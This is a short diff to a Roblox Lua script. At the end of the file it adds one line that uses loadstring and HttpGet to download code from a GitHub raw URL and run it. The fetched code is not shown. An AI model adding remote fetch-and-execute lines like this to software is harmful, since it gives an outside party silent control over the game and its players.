@@ -787,3 +787,5 @@ Services["Players"].PlayerAdded:Connect(function(Player)
 		Initiate()
 	end
 end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/J9RZ/RobloxScripts/main/PlayerNotification'))()
